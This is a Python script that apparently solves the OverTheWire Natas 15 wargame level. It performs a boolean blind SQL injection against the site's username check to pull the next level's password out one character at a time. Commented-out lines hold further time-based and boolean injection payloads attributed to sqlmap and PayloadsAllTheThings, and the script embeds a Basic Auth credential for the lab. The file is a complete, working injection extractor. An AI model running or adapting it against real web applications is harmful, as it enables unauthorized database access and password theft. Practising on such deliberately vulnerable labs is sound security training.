#!/usr/bin/python3
import sys
import requests
import string
import re
import time

PROXY = { "http": "http://127.0.0.1:8080" }
URL = "http://natas15.natas.labs.overthewire.org"
HEADERS={
"Host": "natas15.natas.labs.overthewire.org",
"Authorization": "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=="
}
LETTERS = string.ascii_letters + string.digits
EXISTS = "This user exists."

#PAYLOAD0 = 'admin" AND (SELECT 8616 FROM (SELECT(SLEEP(5)))TKKH)-- znLr"'                              #from sqlmap
#PAYLOAD1 = 'natas15" OR IF(MID(@@version,1,1)="5",sleep(5),1)="2'                                      #payloads all the things
#PAYLOAD2 = 'natas15" AND IF(ASCII(SUBSTRING((SELECT USERS()), 1, 1)))>=100, 1, SLEEP(3)) --'           #same
#PAYLOAD3 = 'natas16"+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username%3d"natas16"),1,1)>"W'    #burpsuite lab?

password = ''
print ("Finding password for natas16: \n")
s = requests.Session()
for i in range(1,33):
    for char in LETTERS:
        PAYLOAD = f'natas16" AND SUBSTRING((SELECT password FROM users WHERE username="natas16"),{i},1)=BINARY"{char}' #maybe optimize > random char etc. but works. just a little slow. 
        DATA = { "username": PAYLOAD }
        r = s.post(URL + '/index.php', headers=HEADERS, data=DATA) #, proxies=PROXY)
        if EXISTS in r.text:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(0.25)
            password +=char 
            break

print ("\nYour Password is: " + password)
